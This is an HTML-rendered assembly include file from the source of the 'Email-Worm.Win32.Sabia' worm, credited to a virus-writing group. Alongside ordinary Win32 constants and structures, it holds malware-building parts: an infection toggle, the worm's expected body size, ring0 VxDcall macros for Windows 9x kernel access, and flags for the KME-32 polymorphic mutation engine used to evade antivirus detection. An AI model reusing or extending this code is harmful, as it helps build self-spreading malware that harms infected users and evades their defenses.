<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Sabia - _param.INC.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">   </span><span class="sc1">; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II</span><span class="sc0">
   </span><span class="sc1">; </span><span class="sc0">
   </span><span class="sc1">; by: NBK &amp; Ultras / MATRiX</span><span class="sc0">

   </span><span class="sc5">TIMES_INFECT</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">   </span><span class="sc1">;   FALSE</span><span class="sc0">

   </span><span class="sc5">SII</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">33792</span><span class="sc0">   </span><span class="sc1">;   wrong size = crash !</span><span class="sc0">
   </span><span class="sc5">SII_VER</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00001000</span><span class="sc0">

   </span><span class="sc5">FALSE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">

   </span><span class="sc5">JUMP</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SII</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc9">ENDM</span><span class="sc0">

   </span><span class="sc5">dia</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc4">)*</span><span class="sc2">1000</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">

   </span><span class="sc5">CREATE_NEW</span><span class="sc0">                           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">                        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">                        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc5">OPEN_ALWAYS</span><span class="sc0">                          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">TRUNCATE_EXISTING</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

   </span><span class="sc5">GENERIC_READ</span><span class="sc0">                         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
   </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">                        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
   </span><span class="sc5">GENERIC_EXECUTE</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0">
   </span><span class="sc5">GENERIC_ALL</span><span class="sc0">                          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10000000h</span><span class="sc0">

   </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
     </span><span class="sc5">dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">ftCreationTime</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">ftLastAccessTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">ftLastWriteTime</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">cFileName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">cAlternateFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

   </span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
     </span><span class="sc5">cb</span><span class="sc0">                </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">lpReserved</span><span class="sc0">        </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">lpDesktop</span><span class="sc0">         </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">lpTitle</span><span class="sc0">           </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwX</span><span class="sc0">               </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwY</span><span class="sc0">               </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwXSize</span><span class="sc0">           </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwYSize</span><span class="sc0">           </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwXCountChars</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwYCountChars</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwFillAttribute</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwFlags</span><span class="sc0">           </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wShowWindow</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">cbReserved2</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">lpReserved2</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">hStdInput</span><span class="sc0">         </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">hStdOutput</span><span class="sc0">        </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">hStdError</span><span class="sc0">         </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

   </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
     </span><span class="sc5">hProcess</span><span class="sc0">      </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">hThread</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwProcessId</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwThreadId</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

   </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
   </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
   </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
   </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
   </span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
   </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
   </span><span class="sc5">FILE_ATTRIBUTE_TEMPORARY</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
   </span><span class="sc5">FILE_ATTRIBUTE_COMPRESSED</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">800h</span><span class="sc0">

   </span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
     </span><span class="sc5">wYear</span><span class="sc0">             </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wMonth</span><span class="sc0">            </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wDayOfWeek</span><span class="sc0">        </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wDay</span><span class="sc0">              </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wHour</span><span class="sc0">             </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wMinute</span><span class="sc0">           </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wSecond</span><span class="sc0">           </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wMilliseconds</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

   </span><span class="sc5">DRIVE_REMOVABLE</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc5">DRIVE_FIXED</span><span class="sc0">                          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc5">DRIVE_REMOTE</span><span class="sc0">                         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">DRIVE_CDROM</span><span class="sc0">                          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc5">DRIVE_RAMDISK</span><span class="sc0">                        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

   </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
     </span><span class="sc5">dwLowDateTime</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwHighDateTime</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

   </span><span class="sc5">ERROR_ALREADY_EXISTS</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">183</span><span class="sc0">

   </span><span class="sc5">OSVERSIONINFOA</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
     </span><span class="sc5">dwOSVersionInfoSize</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwMajorVersion</span><span class="sc0">        </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwMinorVersion</span><span class="sc0">        </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwBuildNumber</span><span class="sc0">         </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">dwPlatformId</span><span class="sc0">          </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">szCSDVersion</span><span class="sc0">          </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">OSVERSIONINFOA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

   </span><span class="sc5">OSVERSIONINFO</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc5">OSVERSIONINFOA</span><span class="sc4">&gt;</span><span class="sc0">

   </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">
   </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">

   </span><span class="sc5">WSADESCRIPTION_LEN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
   </span><span class="sc5">WSASYS_STATUS_LEN</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">

   </span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
     </span><span class="sc5">wVersion</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">wHighVersion</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">szDescription</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">WSADESCRIPTION_LEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">szSystemStatus</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">WSASYS_STATUS_LEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">iMaxSockets</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">iMaxUdpDg</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">lpVendorInfo</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc1">; ring0.inc</span><span class="sc0">


</span><span class="sc5">VMM</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">VXDLDR</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0027h</span><span class="sc0">
</span><span class="sc5">GetDeviceList</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0005h</span><span class="sc0">
</span><span class="sc5">Get_DDB</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0146h</span><span class="sc0">
</span><span class="sc5">PageQuery</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0134h</span><span class="sc0">



</span><span class="sc5">VxDcall</span><span class="sc0">                 </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">VxD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Service</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">Service</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">VxD</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VMMcall</span><span class="sc0">                 </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">Service</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">VMM</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Service</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">



</span><span class="sc5">pusho</span><span class="sc0">                   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">lbl</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">__tmp</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__tmp</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">lbl</span><span class="sc0">
</span><span class="sc5">__tmp</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc9">endm</span><span class="sc0">

   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MESS</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">

   </span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc1">;kme3.INT</span><span class="sc0">


</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; KME-32  v3.00   Kewl Mutation Engine   (c) 99-00  Z0MBiE, Vecna</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc1">; --------------------- flags -----------------------------------------------</span><span class="sc0">

</span><span class="sc5">FLAG_DEBUG</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0"> </span><span class="sc1">; insert INT3 into poly decr</span><span class="sc0">
</span><span class="sc5">FLAG_NOLOGIC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0"> </span><span class="sc1">; disable "logic"</span><span class="sc0">
</span><span class="sc5">FLAG_NOJMPS</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0"> </span><span class="sc1">; disable JMPs.</span><span class="sc0">
  </span><span class="sc1">; NOJMPS means generate continuous block of code</span><span class="sc0">
</span><span class="sc5">FLAG_EIP0</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0"> </span><span class="sc1">; initial entry = 0, not rnd</span><span class="sc0">
</span><span class="sc5">FLAG_NOSHORT</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010h</span><span class="sc0"> </span><span class="sc1">; disable short-opcodes for EAX</span><span class="sc0">
</span><span class="sc1">; v3.00+</span><span class="sc0">
</span><span class="sc5">FLAG_NOSHORT_C</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc1">; disable short-consts usage</span><span class="sc0">
</span><span class="sc5">FLAG_NOSWAP</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000040h</span><span class="sc0"> </span><span class="sc1">; disable [cmd r1,r2] perverting</span><span class="sc0">

</span><span class="sc1">; --------------------- registers -------------------------------------------</span><span class="sc0">

</span><span class="sc5">REG_EAX</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0"> </span><span class="sc1">; bitfields for register mask</span><span class="sc0">
</span><span class="sc5">REG_ECX</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">REG_EDX</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0"> </span><span class="sc1">; at least 1 register should</span><span class="sc0">
</span><span class="sc5">REG_EBX</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0"> </span><span class="sc1">; be specified.</span><span class="sc0">
</span><span class="sc5">REG_ESP</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010h</span><span class="sc0"> </span><span class="sc1">; use REG_DEFAULT otherwise</span><span class="sc0">
</span><span class="sc5">REG_EBP</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">REG_ESI</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000040h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">REG_EDI</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">REG_ALL</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">REG_ESP</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">

</span><span class="sc5">REG_DEFAULT</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">REG_EAX</span><span class="sc0">

</span><span class="sc5">REG_EAX_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">REG_ECX_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">REG_EDX_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">REG_EBX_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">REG_ESP_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">REG_EBP_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">REG_ESI_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">REG_EDI_N</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc1">; --------------------- commands --------------------------------------------</span><span class="sc0">

</span><span class="sc5">CMD_ALL</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; use all available commands</span><span class="sc0">

</span><span class="sc5">CMD_MOV</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">; bitfields for command mask</span><span class="sc0">
</span><span class="sc5">CMD_XCHG</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_ADD</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">; at least 1 command should</span><span class="sc0">
</span><span class="sc5">CMD_SUB</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">; be specified. default=XOR</span><span class="sc0">
</span><span class="sc5">CMD_XOR</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_INC</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0">       </span><span class="sc1">; all CMD_xxx commands can be</span><span class="sc0">
</span><span class="sc5">CMD_DEC</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000040h</span><span class="sc0">       </span><span class="sc1">; disabled by FLAG_NOLOGIC</span><span class="sc0">
</span><span class="sc5">CMD_OR</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CMD_AND</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000100h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
